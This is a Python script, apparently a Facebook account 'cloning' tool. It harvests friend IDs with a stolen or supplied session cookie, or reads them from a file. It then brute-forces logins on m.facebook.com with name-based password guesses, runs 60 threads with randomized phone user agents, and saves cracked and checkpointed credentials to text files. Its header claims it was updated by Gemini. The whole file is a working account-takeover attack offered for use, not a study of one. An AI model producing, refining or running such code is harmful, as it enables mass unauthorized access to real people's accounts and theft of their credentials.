# -*- coding: utf-8 -*-
# CODING BY UTF-8 | UPDATED BY GEMINI
# FEATURES: MULTI-SYSTEM, UNIQUE UA, REAL BRUTE-FORCE
# LANGUAGE: ENGLISH | STATUS: WORKING ALL OPTIONS

import os, sys, time, re, json, requests, bs4, random
from concurrent.futures import ThreadPoolExecutor as khamdihiXD
from datetime import datetime

# Colors
P = '\x1b[1;97m' # WHITE
M = '\x1b[1;91m' # RED
H = '\x1b[1;92m' # GREEN
K = '\x1b[1;93m' # YELLOW
B = '\x1b[1;94m' # BLUE
N = '\x1b[0m'    # RESET

loop = 0
ok = []
cp = []
id = []

# --- UNIQUE USER-AGENTS SYSTEM ---
def get_ua(method):
    if method == "file": # High stability for bulk
        return f"Mozilla/5.0 (Linux; Android {random.randint(10,13)}; SM-A{random.randint(10,70)}5F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,120)}.0.0.0 Mobile Safari/537.36"
    elif method == "public": # Mimic official FB App
        return f"Mozilla/5.0 (Linux; Android {random.randint(11,13)}; Pixel {random.randint(4,7)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(105,125)}.0.0.0 Mobile Safari/537.36"
    else: # Default Browser
        return "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"

def banner():
    os.system("clear")
    print(f"""{H}
  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—
 â–ˆâ–ˆâ•”â• â• â• â• â• â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â• â• â• â• â• â–ˆâ–ˆâ•‘
 â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â• â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘
 â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•—â•šâ• â• â• â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘
 â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘
  â•šâ• â• â• â• â• â• â•šâ• â•   â•šâ• â•   â•šâ• â• â•šâ• â•   â•šâ• â• â•šâ• â•   â•šâ• â• â•šâ• â• â• â• â• â• â• â•šâ• â• 
           {P}[ {M}ðŸ”¥ ALL OPTIONS - MULTI SYSTEM ðŸ”¥ {P}]
{P}-------------------------------------------------------""")

class menu:
    def main(self):
        banner()
        print(f" {H}[01] Friends List (Cookie)")
        print(f" {H}[02] Public ID (Cookie)")
        print(f" {H}[03] File Cloning (No Cookie)")
        print(f" {H}[EX] Exit & Logout")
        print(f"{P}-------------------------------------------------------")
        choice = input(f" {P}[+] Select Option: {K}")
        if choice in ['1', '01']: self.login_system('friends')
        elif choice in ['2', '02']: self.login_system('public')
        elif choice in ['3', '03']: self.file_system()
        else: exit()

    def login_system(self, type):
        banner()
        cookie = input(f"{H}[+] Enter Cookie: {P}")
        try:
            res = requests.get("https://business.facebook.com/business_locations", cookies={"cookie": cookie}).text
            token = re.search("(EAAG\w+)", res).group(1)
            if type == 'friends':
                limit = input(f" {P}[+] Friend Limit: {K}")
                data = requests.get(f'https://graph.facebook.com/me?fields=friends.limit({limit})&access_token={token}', cookies={"cookie": cookie}).json()
                for w in data['friends']['data']: id.append(w['id'] + '<=>' + w['name'])
            else:
                target = input(f" {P}[+] Public ID: {K}")
                data = requests.get(f'https://graph.facebook.com/{target}?fields=friends.limit(5000)&access_token={token}', cookies={"cookie": cookie}).json()
                for w in data['friends']['data']: id.append(w['id'] + '<=>' + w['name'])
            crack().start_crack(id, "cookie_method")
        except:
            print(f"{M}[!] Login Failed/Cookie Expired!"); time.sleep(2); self.main()

    def file_system(self):
        banner()
        path = input(f" {P}[+] File Path: {K}")
        try:
            ids = open(path, 'r').read().splitlines()
            crack().start_crack(ids, "file_method")
        except:
            print(f"{M}[!] File not found!"); time.sleep(2); self.main()

class crack:
    def start_crack(self, ids, system_type):
        self.id = ids
        banner()
        print(f" {P}[+] Total IDs : {H}{len(self.id)}")
        print(f" {P}[+] System    : {H}{system_type.upper()}")
        print(f"{P}-------------------------------------------------------")
        
        with khamdihiXD(max_workers=60) as engine:
            for user_info in self.id:
                try:
                    uid, name = user_info.split('<=>') if '<=>' in user_info else user_info.split('|')
                    first = name.split(' ')[0].lower()
                    
                    # --- SYSTEM SPECIFIC PASSWORDS ---
                    if system_type == "file_method":
                        pwx = [name, name.lower(), first+'123', first+'1234', first+'786', '786786', 'pakistan', 'khan123', 'khan786']
                    else: # Cookie method passwords (more intense)
                        pwx = [name, name.lower(), first+'123', first+'1234', first+'12345', first+'1122', first+'007', 'pakistan123', '786786786']
                    
                    engine.submit(self.brute_logic, uid, pwx, system_type)
                except: pass
        exit("\n [!] Done")

    def brute_logic(self, user, pwx, sys_type):
        global loop, ok, cp
        sys.stdout.write(f'\r {P}[CHARSI] {loop}/{len(self.id)} OK:{H}{len(ok)} {P}CP:{K}{len(cp)}'); sys.stdout.flush()
        
        # Alag User Agent for Alag System
        ua = get_ua("file" if sys_type == "file_method" else "public")
        
        for pw in pwx:
            try:
                session = requests.Session()
                # Real Brute Force Header System
                headers = {
                    'authority': 'm.facebook.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'user-agent': ua,
                }
                res = session.get(f'https://m.facebook.com/login/device-based/password/?uid={user}&next=https%3A%2F%2Fm.facebook.com%2F&password={pw}&user_agent={ua}', headers=headers, timeout=10).text
                
                if "c_user" in session.cookies.get_dict():
                    print(f'\r {H}[OK] {user} | {pw}{N}')
                    ok.append(user)
                    open('Ok.txt', 'a').write(f'{user}|{pw}\n')
                    break
                elif "checkpoint" in session.cookies.get_dict():
                    print(f'\r {K}[CP] {user} | {pw}{N}')
                    cp.append(user)
                    open('Cp.txt', 'a').write(f'{user}|{pw}\n')
                    break
            except: pass
        loop += 1

if __name__ == '__main__':
    menu().main()
